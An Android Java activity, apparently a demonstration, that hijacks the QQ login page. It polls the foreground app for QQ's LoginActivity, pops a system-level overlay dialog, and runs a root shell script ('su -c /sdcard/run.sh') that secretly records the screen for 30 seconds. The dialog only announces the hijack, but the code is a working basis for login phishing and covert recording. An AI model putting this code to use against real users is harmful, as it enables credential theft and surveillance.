package ma.mhy.apkhook;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Bundle;
import android.os.Looper;
import android.view.WindowManager;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

import ma.mhy.apkhook.util.AssetsUtils;

/***
 * QQ页面劫持
 */
public class JieChiActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_jie_chi);
    }
    /**
     * 1. 线程池的概念：
     * <p>
     * 线程池就是首先创建一些线程，它们的集合称为线程池。使用线程池可以很好地提高性能，
     * 线程池在系统启动时即创建大量空闲的线程，程序将一个任务传给线程池，线程池就会启动一条线程来执行这个任务，
     * 执行结束以后，该线程并不会死亡，而是再次返回线程池中成为空闲状态，等待执行下一个任务。
     * <p>
     * 2. 线程池的工作机制
     * <p>
     * 2.1 在线程池的编程模式下，任务是提交给整个线程池，而不是直接提交给某个线程，
     * 线程池在拿到任务后，就在内部寻找是否有空闲的线程，如果有，则将任务交给某个空闲的线程。
     * <p>
     * 2.1 一个线程同时只能执行一个任务，但可以同时向一个线程池提交多个任务。
     * <p>
     * 3. 使用线程池的原因：
     * <p>
     * 多线程运行时间，系统不断的启动和关闭新线程，成本非常高，会过渡消耗系统资源，以及过渡切换线程的危险，
     * 从而可能导致系统资源的崩溃。这时，线程池就是最好的选择了。
     */

  //  后台会开启一个后台服务，用于循环检测当前顶层页面是否是我们需要劫持的，如果不是，继续检测
    public void Thread (){
      new Thread(new Runnable() {

          @Override
          public void run() {
              Looper.prepare();
              while (true) {
                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                  List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
                  if (tasks.get(0).topActivity.getClassName().equals("com.tencent.mobileqq.activity.LoginActivity")) {
                      inject();
                      RunAsRooter();
                      break;
                  }
                  try {
                      Thread.sleep(500);
                  } catch (InterruptedException e) {
                      // TODO Auto-generated catch block
                      e.printStackTrace();
                  }
              }
              Looper.loop();
          }
      }).start();
  }
//    实现后台录像
//    调用root权限执行sd卡下的一个脚本文件，那这个脚本代码是什么呢，也就一行代码
//    screenrecord --time-limit 30 /sdcard/demo.mp4
//    调用system/bin下的可执行文件进行录像，这里设置的时间为30秒，保存在sd卡下，所以这里也需要设置相关权限
    private void RunAsRooter() {
        try {//找到文件>命名为x文件复制到sdcard/
            AssetsUtils.copy(this.getAssets(), "run.sh", "run.sh");
            Runtime.getRuntime().exec("su -c /sdcard/run.sh").waitFor();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }
//    考虑到弹窗是需要在主线程中执行的，所以必须调用Looper，每次检测的间隔时间为500毫秒，必须过多检测导致系统卡顿，
//    检测到后就开启一个弹窗
//    全局弹窗，所以必须设置为系统级弹窗，同时需要注意添加权限
    private void inject() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("提示");
        builder.setMessage("你的界面已经被劫持了");

        final AlertDialog dialog = builder.create();

        dialog.getWindow().setType((WindowManager.LayoutParams.TYPE_SYSTEM_ALERT));
        dialog.show();
    }
}
